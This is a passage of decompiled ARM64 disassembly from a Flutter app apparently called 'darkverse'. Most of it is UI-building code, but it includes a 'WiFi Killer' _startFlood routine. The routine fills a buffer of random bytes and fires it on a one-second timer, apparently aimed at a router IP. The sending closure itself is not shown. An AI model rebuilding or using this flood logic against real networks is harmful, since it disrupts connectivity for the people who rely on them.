    //     0x94b01c: ldr             x0, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x94b020: StoreField: r1->field_23 = r0
    //     0x94b020: stur            w0, [x1, #0x23]
    // 0x94b024: r0 = Instance_Clip
    //     0x94b024: ldr             x0, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x94b028: StoreField: r1->field_2b = r0
    //     0x94b028: stur            w0, [x1, #0x2b]
    // 0x94b02c: StoreField: r1->field_2f = rZR
    //     0x94b02c: stur            xzr, [x1, #0x2f]
    // 0x94b030: ldur            x0, [fp, #-8]
    // 0x94b034: StoreField: r1->field_b = r0
    //     0x94b034: stur            w0, [x1, #0xb]
    // 0x94b038: r0 = Padding()
    //     0x94b038: bl              #0x64152c  ; AllocatePaddingStub -> Padding (size=0x14)
    // 0x94b03c: mov             x1, x0
    // 0x94b040: r0 = Instance_EdgeInsets
    //     0x94b040: add             x0, PP, #0x26, lsl #12  ; [pp+0x260d8] Obj!EdgeInsets@a07a61
    //     0x94b044: ldr             x0, [x0, #0xd8]
    // 0x94b048: stur            x1, [fp, #-8]
    // 0x94b04c: StoreField: r1->field_f = r0
    //     0x94b04c: stur            w0, [x1, #0xf]
    // 0x94b050: ldur            x0, [fp, #-0x10]
    // 0x94b054: StoreField: r1->field_b = r0
    //     0x94b054: stur            w0, [x1, #0xb]
    // 0x94b058: r0 = Scaffold()
    //     0x94b058: bl              #0x6945f0  ; AllocateScaffoldStub -> Scaffold (size=0x78)
    // 0x94b05c: ldur            x1, [fp, #-0x20]
    // 0x94b060: ArrayStore: r0[0] = r1  ; List_4
    //     0x94b060: stur            w1, [x0, #0x17]
    // 0x94b064: ldur            x1, [fp, #-8]
    // 0x94b068: StoreField: r0->field_1b = r1
    //     0x94b068: stur            w1, [x0, #0x1b]
    // 0x94b06c: r1 = Instance_AlignmentDirectional
    //     0x94b06c: add             x1, PP, #0xd, lsl #12  ; [pp+0xd168] Obj!AlignmentDirectional@a09c31
    //     0x94b070: ldr             x1, [x1, #0x168]
    // 0x94b074: StoreField: r0->field_2f = r1
    //     0x94b074: stur            w1, [x0, #0x2f]
    // 0x94b078: r1 = Instance_Color
    //     0x94b078: add             x1, PP, #0xb, lsl #12  ; [pp+0xbdc0] Obj!Color@a0e491
    //     0x94b07c: ldr             x1, [x1, #0xdc0]
    // 0x94b080: StoreField: r0->field_4f = r1
    //     0x94b080: stur            w1, [x0, #0x4f]
    // 0x94b084: r1 = true
    //     0x94b084: add             x1, NULL, #0x20  ; true
    // 0x94b088: StoreField: r0->field_5f = r1
    //     0x94b088: stur            w1, [x0, #0x5f]
    // 0x94b08c: r2 = Instance_DragStartBehavior
    //     0x94b08c: ldr             x2, [PP, #0x5090]  ; [pp+0x5090] Obj!DragStartBehavior@a418a1
    // 0x94b090: StoreField: r0->field_63 = r2
    //     0x94b090: stur            w2, [x0, #0x63]
    // 0x94b094: r2 = false
    //     0x94b094: add             x2, NULL, #0x30  ; false
    // 0x94b098: StoreField: r0->field_b = r2
    //     0x94b098: stur            w2, [x0, #0xb]
    // 0x94b09c: StoreField: r0->field_f = r1
    //     0x94b09c: stur            w1, [x0, #0xf]
    // 0x94b0a0: StoreField: r0->field_13 = r2
    //     0x94b0a0: stur            w2, [x0, #0x13]
    // 0x94b0a4: r2 = Closure: (BuildContext, Animation<double>) => Widget from Function '_defaultBottomSheetScrimBuilder@89420462': static.
    //     0x94b0a4: add             x2, PP, #0xd, lsl #12  ; [pp+0xd170] Closure: (BuildContext, Animation<double>) => Widget from Function '_defaultBottomSheetScrimBuilder@89420462': static. (0x75b335bba4)
    //     0x94b0a8: ldr             x2, [x2, #0x170]
    // 0x94b0ac: StoreField: r0->field_4b = r2
    //     0x94b0ac: stur            w2, [x0, #0x4b]
    // 0x94b0b0: StoreField: r0->field_6b = r1
    //     0x94b0b0: stur            w1, [x0, #0x6b]
    // 0x94b0b4: StoreField: r0->field_6f = r1
    //     0x94b0b4: stur            w1, [x0, #0x6f]
    // 0x94b0b8: LeaveFrame
    //     0x94b0b8: mov             SP, fp
    //     0x94b0bc: ldp             fp, lr, [SP], #0x10
    // 0x94b0c0: ret
    //     0x94b0c0: ret             
    // 0x94b0c4: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94b0c4: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94b0c8: b               #0x94a614
  }
  _ _infoRow(/* No info */) {
    // ** addr: 0x94b0cc, size: 0x1f4
    // 0x94b0cc: EnterFrame
    //     0x94b0cc: stp             fp, lr, [SP, #-0x10]!
    //     0x94b0d0: mov             fp, SP
    // 0x94b0d4: AllocStack(0x38)
    //     0x94b0d4: sub             SP, SP, #0x38
    // 0x94b0d8: r0 = 4
    //     0x94b0d8: mov             x0, #4
    // 0x94b0dc: mov             x5, x1
    // 0x94b0e0: mov             x4, x2
    // 0x94b0e4: stur            x1, [fp, #-8]
    // 0x94b0e8: stur            x2, [fp, #-0x10]
    // 0x94b0ec: stur            x3, [fp, #-0x18]
    // 0x94b0f0: CheckStackOverflow
    //     0x94b0f0: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94b0f4: cmp             SP, x16
    //     0x94b0f8: b.ls            #0x94b2b8
    // 0x94b0fc: mov             x2, x0
    // 0x94b100: r1 = Null
    //     0x94b100: mov             x1, NULL
    // 0x94b104: r0 = AllocateArray()
    //     0x94b104: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94b108: mov             x1, x0
    // 0x94b10c: ldur            x0, [fp, #-0x10]
    // 0x94b110: StoreField: r1->field_f = r0
    //     0x94b110: stur            w0, [x1, #0xf]
    // 0x94b114: r16 = ": "
    //     0x94b114: ldr             x16, [PP, #0xb28]  ; [pp+0xb28] ": "
    // 0x94b118: StoreField: r1->field_13 = r16
    //     0x94b118: stur            w16, [x1, #0x13]
    // 0x94b11c: str             x1, [SP]
    // 0x94b120: r0 = _interpolate()
    //     0x94b120: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x94b124: mov             x1, x0
    // 0x94b128: ldur            x0, [fp, #-8]
    // 0x94b12c: stur            x1, [fp, #-0x20]
    // 0x94b130: LoadField: r2 = r0->field_3b
    //     0x94b130: ldur            w2, [x0, #0x3b]
    // 0x94b134: DecompressPointer r2
    //     0x94b134: add             x2, x2, HEAP, lsl #32
    // 0x94b138: stur            x2, [fp, #-0x10]
    // 0x94b13c: r0 = TextStyle()
    //     0x94b13c: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94b140: mov             x1, x0
    // 0x94b144: r0 = true
    //     0x94b144: add             x0, NULL, #0x20  ; true
    // 0x94b148: stur            x1, [fp, #-0x28]
    // 0x94b14c: StoreField: r1->field_7 = r0
    //     0x94b14c: stur            w0, [x1, #7]
    // 0x94b150: ldur            x2, [fp, #-0x10]
    // 0x94b154: StoreField: r1->field_b = r2
    //     0x94b154: stur            w2, [x1, #0xb]
    // 0x94b158: r2 = Instance_FontWeight
    //     0x94b158: add             x2, PP, #0xc, lsl #12  ; [pp+0xcf08] Obj!FontWeight@a0c471
    //     0x94b15c: ldr             x2, [x2, #0xf08]
    // 0x94b160: StoreField: r1->field_23 = r2
    //     0x94b160: stur            w2, [x1, #0x23]
    // 0x94b164: r0 = Text()
    //     0x94b164: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94b168: mov             x1, x0
    // 0x94b16c: ldur            x0, [fp, #-0x20]
    // 0x94b170: stur            x1, [fp, #-0x30]
    // 0x94b174: StoreField: r1->field_b = r0
    //     0x94b174: stur            w0, [x1, #0xb]
    // 0x94b178: ldur            x0, [fp, #-0x28]
    // 0x94b17c: StoreField: r1->field_13 = r0
    //     0x94b17c: stur            w0, [x1, #0x13]
    // 0x94b180: ldur            x0, [fp, #-8]
    // 0x94b184: LoadField: r2 = r0->field_37
    //     0x94b184: ldur            w2, [x0, #0x37]
    // 0x94b188: DecompressPointer r2
    //     0x94b188: add             x2, x2, HEAP, lsl #32
    // 0x94b18c: stur            x2, [fp, #-0x10]
    // 0x94b190: r0 = TextStyle()
    //     0x94b190: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94b194: mov             x1, x0
    // 0x94b198: r0 = true
    //     0x94b198: add             x0, NULL, #0x20  ; true
    // 0x94b19c: stur            x1, [fp, #-8]
    // 0x94b1a0: StoreField: r1->field_7 = r0
    //     0x94b1a0: stur            w0, [x1, #7]
    // 0x94b1a4: ldur            x0, [fp, #-0x10]
    // 0x94b1a8: StoreField: r1->field_b = r0
    //     0x94b1a8: stur            w0, [x1, #0xb]
    // 0x94b1ac: r0 = "ShareTechMono"
    //     0x94b1ac: add             x0, PP, #0x18, lsl #12  ; [pp+0x187c8] "ShareTechMono"
    //     0x94b1b0: ldr             x0, [x0, #0x7c8]
    // 0x94b1b4: StoreField: r1->field_13 = r0
    //     0x94b1b4: stur            w0, [x1, #0x13]
    // 0x94b1b8: r0 = Text()
    //     0x94b1b8: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94b1bc: mov             x2, x0
    // 0x94b1c0: ldur            x0, [fp, #-0x18]
    // 0x94b1c4: stur            x2, [fp, #-0x10]
    // 0x94b1c8: StoreField: r2->field_b = r0
    //     0x94b1c8: stur            w0, [x2, #0xb]
    // 0x94b1cc: ldur            x0, [fp, #-8]
    // 0x94b1d0: StoreField: r2->field_13 = r0
    //     0x94b1d0: stur            w0, [x2, #0x13]
    // 0x94b1d4: r1 = <FlexParentData>
    //     0x94b1d4: add             x1, PP, #0x11, lsl #12  ; [pp+0x11550] TypeArguments: <FlexParentData>
    //     0x94b1d8: ldr             x1, [x1, #0x550]
    // 0x94b1dc: r0 = Expanded()
    //     0x94b1dc: bl              #0x6b0720  ; AllocateExpandedStub -> Expanded (size=0x20)
    // 0x94b1e0: mov             x3, x0
    // 0x94b1e4: r0 = 1
    //     0x94b1e4: mov             x0, #1
    // 0x94b1e8: stur            x3, [fp, #-8]
    // 0x94b1ec: StoreField: r3->field_13 = r0
    //     0x94b1ec: stur            x0, [x3, #0x13]
    // 0x94b1f0: r0 = Instance_FlexFit
    //     0x94b1f0: add             x0, PP, #0xc, lsl #12  ; [pp+0xcbe0] Obj!FlexFit@a40421
    //     0x94b1f4: ldr             x0, [x0, #0xbe0]
    // 0x94b1f8: StoreField: r3->field_1b = r0
    //     0x94b1f8: stur            w0, [x3, #0x1b]
    // 0x94b1fc: ldur            x0, [fp, #-0x10]
    // 0x94b200: StoreField: r3->field_b = r0
    //     0x94b200: stur            w0, [x3, #0xb]
    // 0x94b204: r1 = Null
    //     0x94b204: mov             x1, NULL
    // 0x94b208: r2 = 4
    //     0x94b208: mov             x2, #4
    // 0x94b20c: r0 = AllocateArray()
    //     0x94b20c: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94b210: mov             x2, x0
    // 0x94b214: ldur            x0, [fp, #-0x30]
    // 0x94b218: stur            x2, [fp, #-0x10]
    // 0x94b21c: StoreField: r2->field_f = r0
    //     0x94b21c: stur            w0, [x2, #0xf]
    // 0x94b220: ldur            x0, [fp, #-8]
    // 0x94b224: StoreField: r2->field_13 = r0
    //     0x94b224: stur            w0, [x2, #0x13]
    // 0x94b228: r1 = <Widget>
    //     0x94b228: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x94b22c: r0 = AllocateGrowableArray()
    //     0x94b22c: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x94b230: mov             x1, x0
    // 0x94b234: ldur            x0, [fp, #-0x10]
    // 0x94b238: stur            x1, [fp, #-8]
    // 0x94b23c: StoreField: r1->field_f = r0
    //     0x94b23c: stur            w0, [x1, #0xf]
    // 0x94b240: r0 = 4
    //     0x94b240: mov             x0, #4
    // 0x94b244: StoreField: r1->field_b = r0
    //     0x94b244: stur            w0, [x1, #0xb]
    // 0x94b248: r0 = Row()
    //     0x94b248: bl              #0x6b1530  ; AllocateRowStub -> Row (size=0x38)
    // 0x94b24c: mov             x1, x0
    // 0x94b250: r0 = Instance_Axis
    //     0x94b250: ldr             x0, [PP, #0x46d8]  ; [pp+0x46d8] Obj!Axis@a407e1
    // 0x94b254: stur            x1, [fp, #-0x10]
    // 0x94b258: StoreField: r1->field_f = r0
    //     0x94b258: stur            w0, [x1, #0xf]
    // 0x94b25c: r0 = Instance_MainAxisAlignment
    //     0x94b25c: ldr             x0, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x94b260: StoreField: r1->field_13 = r0
    //     0x94b260: stur            w0, [x1, #0x13]
    // 0x94b264: r0 = Instance_MainAxisSize
    //     0x94b264: add             x0, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x94b268: ldr             x0, [x0, #0xbc0]
    // 0x94b26c: ArrayStore: r1[0] = r0  ; List_4
    //     0x94b26c: stur            w0, [x1, #0x17]
    // 0x94b270: r0 = Instance_CrossAxisAlignment
    //     0x94b270: ldr             x0, [PP, #0x6f88]  ; [pp+0x6f88] Obj!CrossAxisAlignment@a402c1
    // 0x94b274: StoreField: r1->field_1b = r0
    //     0x94b274: stur            w0, [x1, #0x1b]
    // 0x94b278: r0 = Instance_VerticalDirection
    //     0x94b278: ldr             x0, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x94b27c: StoreField: r1->field_23 = r0
    //     0x94b27c: stur            w0, [x1, #0x23]
    // 0x94b280: r0 = Instance_Clip
    //     0x94b280: ldr             x0, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x94b284: StoreField: r1->field_2b = r0
    //     0x94b284: stur            w0, [x1, #0x2b]
    // 0x94b288: StoreField: r1->field_2f = rZR
    //     0x94b288: stur            xzr, [x1, #0x2f]
    // 0x94b28c: ldur            x0, [fp, #-8]
    // 0x94b290: StoreField: r1->field_b = r0
    //     0x94b290: stur            w0, [x1, #0xb]
    // 0x94b294: r0 = Padding()
    //     0x94b294: bl              #0x64152c  ; AllocatePaddingStub -> Padding (size=0x14)
    // 0x94b298: r1 = Instance_EdgeInsets
    //     0x94b298: add             x1, PP, #0x37, lsl #12  ; [pp+0x37538] Obj!EdgeInsets@a08601
    //     0x94b29c: ldr             x1, [x1, #0x538]
    // 0x94b2a0: StoreField: r0->field_f = r1
    //     0x94b2a0: stur            w1, [x0, #0xf]
    // 0x94b2a4: ldur            x1, [fp, #-0x10]
    // 0x94b2a8: StoreField: r0->field_b = r1
    //     0x94b2a8: stur            w1, [x0, #0xb]
    // 0x94b2ac: LeaveFrame
    //     0x94b2ac: mov             SP, fp
    //     0x94b2b0: ldp             fp, lr, [SP], #0x10
    // 0x94b2b4: ret
    //     0x94b2b4: ret             
    // 0x94b2b8: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94b2b8: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94b2bc: b               #0x94b0fc
  }
  [closure] void _startFlood(dynamic) {
    // ** addr: 0x94b2c0, size: 0x38
    // 0x94b2c0: EnterFrame
    //     0x94b2c0: stp             fp, lr, [SP, #-0x10]!
    //     0x94b2c4: mov             fp, SP
    // 0x94b2c8: ldr             x0, [fp, #0x10]
    // 0x94b2cc: ArrayLoad: r1 = r0[0]  ; List_4
    //     0x94b2cc: ldur            w1, [x0, #0x17]
    // 0x94b2d0: DecompressPointer r1
    //     0x94b2d0: add             x1, x1, HEAP, lsl #32
    // 0x94b2d4: CheckStackOverflow
    //     0x94b2d4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94b2d8: cmp             SP, x16
    //     0x94b2dc: b.ls            #0x94b2f0
    // 0x94b2e0: r0 = _startFlood()
    //     0x94b2e0: bl              #0x94b2f8  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_startFlood
    // 0x94b2e4: LeaveFrame
    //     0x94b2e4: mov             SP, fp
    //     0x94b2e8: ldp             fp, lr, [SP], #0x10
    // 0x94b2ec: ret
    //     0x94b2ec: ret             
    // 0x94b2f0: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94b2f0: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94b2f4: b               #0x94b2e0
  }
  _ _startFlood(/* No info */) {
    // ** addr: 0x94b2f8, size: 0x25c
    // 0x94b2f8: EnterFrame
    //     0x94b2f8: stp             fp, lr, [SP, #-0x10]!
    //     0x94b2fc: mov             fp, SP
    // 0x94b300: AllocStack(0x30)
    //     0x94b300: sub             SP, SP, #0x30
    // 0x94b304: SetupParameters(_WifiKillerPageState this /* r1 => r1, fp-0x8 */)
    //     0x94b304: stur            x1, [fp, #-8]
    // 0x94b308: CheckStackOverflow
    //     0x94b308: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94b30c: cmp             SP, x16
    //     0x94b310: b.ls            #0x94b540
    // 0x94b314: r1 = 2
    //     0x94b314: mov             x1, #2
    // 0x94b318: r0 = AllocateContext()
    //     0x94b318: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x94b31c: mov             x2, x0
    // 0x94b320: ldur            x1, [fp, #-8]
    // 0x94b324: stur            x2, [fp, #-0x10]
    // 0x94b328: StoreField: r2->field_f = r1
    //     0x94b328: stur            w1, [x2, #0xf]
    // 0x94b32c: LoadField: r0 = r1->field_1f
    //     0x94b32c: ldur            w0, [x1, #0x1f]
    // 0x94b330: DecompressPointer r0
    //     0x94b330: add             x0, x0, HEAP, lsl #32
    // 0x94b334: r3 = LoadClassIdInstr(r0)
    //     0x94b334: ldur            x3, [x0, #-1]
    //     0x94b338: ubfx            x3, x3, #0xc, #0x14
    // 0x94b33c: r16 = "-"
    //     0x94b33c: ldr             x16, [PP, #0x33d0]  ; [pp+0x33d0] "-"
    // 0x94b340: stp             x16, x0, [SP]
    // 0x94b344: mov             x0, x3
    // 0x94b348: mov             lr, x0
    // 0x94b34c: ldr             lr, [x21, lr, lsl #3]
    // 0x94b350: blr             lr
    // 0x94b354: tbz             w0, #4, #0x94b38c
    // 0x94b358: ldur            x1, [fp, #-8]
    // 0x94b35c: LoadField: r0 = r1->field_1f
    //     0x94b35c: ldur            w0, [x1, #0x1f]
    // 0x94b360: DecompressPointer r0
    //     0x94b360: add             x0, x0, HEAP, lsl #32
    // 0x94b364: r2 = LoadClassIdInstr(r0)
    //     0x94b364: ldur            x2, [x0, #-1]
    //     0x94b368: ubfx            x2, x2, #0xc, #0x14
    // 0x94b36c: r16 = "Error"
    //     0x94b36c: add             x16, PP, #0xf, lsl #12  ; [pp+0xfb20] "Error"
    //     0x94b370: ldr             x16, [x16, #0xb20]
    // 0x94b374: stp             x16, x0, [SP]
    // 0x94b378: mov             x0, x2
    // 0x94b37c: mov             lr, x0
    // 0x94b380: ldr             lr, [x21, lr, lsl #3]
    // 0x94b384: blr             lr
    // 0x94b388: tbnz            w0, #4, #0x94b3b4
    // 0x94b38c: ldur            x1, [fp, #-8]
    // 0x94b390: r2 = "❌ Error"
    //     0x94b390: add             x2, PP, #0x37, lsl #12  ; [pp+0x37408] "❌ Error"
    //     0x94b394: ldr             x2, [x2, #0x408]
    // 0x94b398: r3 = "Router IP tidak tersedia."
    //     0x94b398: add             x3, PP, #0x37, lsl #12  ; [pp+0x37410] "Router IP tidak tersedia."
    //     0x94b39c: ldr             x3, [x3, #0x410]
    // 0x94b3a0: r0 = _showAlert()
    //     0x94b3a0: bl              #0x94b554  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_showAlert
    // 0x94b3a4: r0 = Null
    //     0x94b3a4: mov             x0, NULL
    // 0x94b3a8: LeaveFrame
    //     0x94b3a8: mov             SP, fp
    //     0x94b3ac: ldp             fp, lr, [SP], #0x10
    // 0x94b3b0: ret
    //     0x94b3b0: ret             
    // 0x94b3b4: ldur            x2, [fp, #-0x10]
    // 0x94b3b8: r1 = Function '<anonymous closure>':.
    //     0x94b3b8: add             x1, PP, #0x37, lsl #12  ; [pp+0x37418] AnonymousClosure: (0x6e8a8c), in [package:darkverse/overlay_entry.dart] _NexusBubbleState::build (0x6e85c0)
    //     0x94b3bc: ldr             x1, [x1, #0x418]
    // 0x94b3c0: r0 = AllocateClosure()
    //     0x94b3c0: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94b3c4: ldur            x1, [fp, #-8]
    // 0x94b3c8: mov             x2, x0
    // 0x94b3cc: r0 = setState()
    //     0x94b3cc: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x94b3d0: ldur            x1, [fp, #-8]
    // 0x94b3d4: r2 = "✅ Started"
    //     0x94b3d4: add             x2, PP, #0x37, lsl #12  ; [pp+0x37420] "✅ Started"
    //     0x94b3d8: ldr             x2, [x2, #0x420]
    // 0x94b3dc: r3 = "WiFi Killer!\nStop Manually."
    //     0x94b3dc: add             x3, PP, #0x37, lsl #12  ; [pp+0x37428] "WiFi Killer!\nStop Manually."
    //     0x94b3e0: ldr             x3, [x3, #0x428]
    // 0x94b3e4: r0 = _showAlert()
    //     0x94b3e4: bl              #0x94b554  ; [package:darkverse/wifi_external.dart] _WifiKillerPageState::_showAlert
    // 0x94b3e8: r1 = <int>
    //     0x94b3e8: ldr             x1, [PP, #0xed0]  ; [pp+0xed0] TypeArguments: <int>
    // 0x94b3ec: r2 = 65495
    //     0x94b3ec: mov             x2, #0xffd7
    // 0x94b3f0: r0 = _GrowableList()
    //     0x94b3f0: bl              #0x457b90  ; [dart:core] _GrowableList::_GrowableList
    // 0x94b3f4: stur            x0, [fp, #-0x20]
    // 0x94b3f8: r2 = 0
    //     0x94b3f8: mov             x2, #0
    // 0x94b3fc: stur            x2, [fp, #-0x18]
    // 0x94b400: CheckStackOverflow
    //     0x94b400: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94b404: cmp             SP, x16
    //     0x94b408: b.ls            #0x94b548
    // 0x94b40c: LoadField: r1 = r0->field_b
    //     0x94b40c: ldur            w1, [x0, #0xb]
    // 0x94b410: r3 = LoadInt32Instr(r1)
    //     0x94b410: sbfx            x3, x1, #1, #0x1f
    // 0x94b414: cmp             x2, x3
    // 0x94b418: b.ge            #0x94b4b0
    // 0x94b41c: r1 = Null
    //     0x94b41c: mov             x1, NULL
    // 0x94b420: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x94b420: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x94b424: r0 = Random()
    //     0x94b424: bl              #0x49cfd8  ; [dart:math] Random::Random
    // 0x94b428: mov             x1, x0
    // 0x94b42c: r2 = 256
    //     0x94b42c: mov             x2, #0x100
    // 0x94b430: r0 = nextInt()
    //     0x94b430: bl              #0x49cd88  ; [dart:math] _Random::nextInt
    // 0x94b434: mov             x2, x0
    // 0x94b438: ldur            x3, [fp, #-0x20]
    // 0x94b43c: LoadField: r0 = r3->field_b
    //     0x94b43c: ldur            w0, [x3, #0xb]
    // 0x94b440: r1 = LoadInt32Instr(r0)
    //     0x94b440: sbfx            x1, x0, #1, #0x1f
    // 0x94b444: mov             x0, x1
    // 0x94b448: ldur            x1, [fp, #-0x18]
    // 0x94b44c: cmp             x1, x0
    // 0x94b450: b.hs            #0x94b550
    // 0x94b454: LoadField: r4 = r3->field_f
    //     0x94b454: ldur            w4, [x3, #0xf]
    // 0x94b458: DecompressPointer r4
    //     0x94b458: add             x4, x4, HEAP, lsl #32
    // 0x94b45c: r0 = BoxInt64Instr(r2)
    //     0x94b45c: sbfiz           x0, x2, #1, #0x1f
    //     0x94b460: cmp             x2, x0, asr #1
    //     0x94b464: b.eq            #0x94b470
    //     0x94b468: bl              #0xbf7e54  ; AllocateMintSharedWithoutFPURegsStub
    //     0x94b46c: stur            x2, [x0, #7]
    // 0x94b470: mov             x1, x4
    // 0x94b474: ldur            x2, [fp, #-0x18]
    // 0x94b478: ArrayStore: r1[r2] = r0  ; List_4
    //     0x94b478: add             x25, x1, x2, lsl #2
    //     0x94b47c: add             x25, x25, #0xf
    //     0x94b480: str             w0, [x25]
    //     0x94b484: tbz             w0, #0, #0x94b4a0
    //     0x94b488: ldurb           w16, [x1, #-1]
    //     0x94b48c: ldurb           w17, [x0, #-1]
    //     0x94b490: and             x16, x17, x16, lsr #2
    //     0x94b494: tst             x16, HEAP, lsr #32
    //     0x94b498: b.eq            #0x94b4a0
    //     0x94b49c: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x94b4a0: add             x0, x2, #1
    // 0x94b4a4: mov             x2, x0
    // 0x94b4a8: mov             x0, x3
    // 0x94b4ac: b               #0x94b3fc
    // 0x94b4b0: ldur            x1, [fp, #-8]
    // 0x94b4b4: ldur            x2, [fp, #-0x10]
    // 0x94b4b8: mov             x3, x0
    // 0x94b4bc: mov             x0, x3
    // 0x94b4c0: StoreField: r2->field_13 = r0
    //     0x94b4c0: stur            w0, [x2, #0x13]
    //     0x94b4c4: ldurb           w16, [x2, #-1]
    //     0x94b4c8: ldurb           w17, [x0, #-1]
    //     0x94b4cc: and             x16, x17, x16, lsr #2
    //     0x94b4d0: tst             x16, HEAP, lsr #32
    //     0x94b4d4: b.eq            #0x94b4dc
    //     0x94b4d8: bl              #0xbf6254  ; WriteBarrierWrappersStub
    // 0x94b4dc: r0 = Duration()
    //     0x94b4dc: bl              #0x456cfc  ; AllocateDurationStub -> Duration (size=0x10)
    // 0x94b4e0: mov             x3, x0
    // 0x94b4e4: r0 = 1000
    //     0x94b4e4: mov             x0, #0x3e8
    // 0x94b4e8: stur            x3, [fp, #-0x20]
    // 0x94b4ec: StoreField: r3->field_7 = r0
    //     0x94b4ec: stur            x0, [x3, #7]
    // 0x94b4f0: ldur            x2, [fp, #-0x10]
    // 0x94b4f4: r1 = Function '<anonymous closure>':.
    //     0x94b4f4: add             x1, PP, #0x37, lsl #12  ; [pp+0x37430] AnonymousClosure: (0x94b998), in [package:darkverse/wifi_external.dart] _WifiKillerPageState::_startFlood (0x94b2f8)
    //     0x94b4f8: ldr             x1, [x1, #0x430]
    // 0x94b4fc: r0 = AllocateClosure()
    //     0x94b4fc: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94b500: ldur            x2, [fp, #-0x20]
    // 0x94b504: mov             x3, x0
    // 0x94b508: r1 = Null
    //     0x94b508: mov             x1, NULL
    // 0x94b50c: r0 = Timer.periodic()
    //     0x94b50c: bl              #0x570930  ; [dart:async] Timer::Timer.periodic
    // 0x94b510: ldur            x1, [fp, #-8]
    // 0x94b514: StoreField: r1->field_27 = r0
    //     0x94b514: stur            w0, [x1, #0x27]
    //     0x94b518: ldurb           w16, [x1, #-1]
    //     0x94b51c: ldurb           w17, [x0, #-1]
    //     0x94b520: and             x16, x17, x16, lsr #2
    //     0x94b524: tst             x16, HEAP, lsr #32
    //     0x94b528: b.eq            #0x94b530
    //     0x94b52c: bl              #0xbf6234  ; WriteBarrierWrappersStub
    // 0x94b530: r0 = Null
    //     0x94b530: mov             x0, NULL
    // 0x94b534: LeaveFrame
    //     0x94b534: mov             SP, fp
    //     0x94b538: ldp             fp, lr, [SP], #0x10
    // 0x94b53c: ret
    //     0x94b53c: ret             
    // 0x94b540: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94b540: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94b544: b               #0x94b314
    // 0x94b548: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94b548: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94b54c: b               #0x94b40c
    // 0x94b550: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x94b550: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
  }
  _ _showAlert(/* No info */) {
    // ** addr: 0x94b554, size: 0x9c
    // 0x94b554: EnterFrame
    //     0x94b554: stp             fp, lr, [SP, #-0x10]!
    //     0x94b558: mov             fp, SP
    // 0x94b55c: AllocStack(0x30)
    //     0x94b55c: sub             SP, SP, #0x30
    // 0x94b560: SetupParameters(_WifiKillerPageState this /* r1 => r1, fp-0x8 */, dynamic _ /* r2 => r2, fp-0x10 */, dynamic _ /* r3 => r3, fp-0x18 */)
    //     0x94b560: stur            x1, [fp, #-8]
    //     0x94b564: stur            x2, [fp, #-0x10]
    //     0x94b568: stur            x3, [fp, #-0x18]
    // 0x94b56c: CheckStackOverflow
    //     0x94b56c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94b570: cmp             SP, x16
    //     0x94b574: b.ls            #0x94b5e4
    // 0x94b578: r1 = 3
    //     0x94b578: mov             x1, #3
    // 0x94b57c: r0 = AllocateContext()
    //     0x94b57c: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x94b580: mov             x1, x0
    // 0x94b584: ldur            x0, [fp, #-8]
    // 0x94b588: StoreField: r1->field_f = r0
    //     0x94b588: stur            w0, [x1, #0xf]
    // 0x94b58c: ldur            x2, [fp, #-0x10]
    // 0x94b590: StoreField: r1->field_13 = r2
    //     0x94b590: stur            w2, [x1, #0x13]
    // 0x94b594: ldur            x2, [fp, #-0x18]
    // 0x94b598: ArrayStore: r1[0] = r2  ; List_4
    //     0x94b598: stur            w2, [x1, #0x17]
    // 0x94b59c: LoadField: r3 = r0->field_f
    //     0x94b59c: ldur            w3, [x0, #0xf]
    // 0x94b5a0: DecompressPointer r3
    //     0x94b5a0: add             x3, x3, HEAP, lsl #32
    // 0x94b5a4: stur            x3, [fp, #-0x10]
    // 0x94b5a8: cmp             w3, NULL
    // 0x94b5ac: b.eq            #0x94b5ec
    // 0x94b5b0: mov             x2, x1
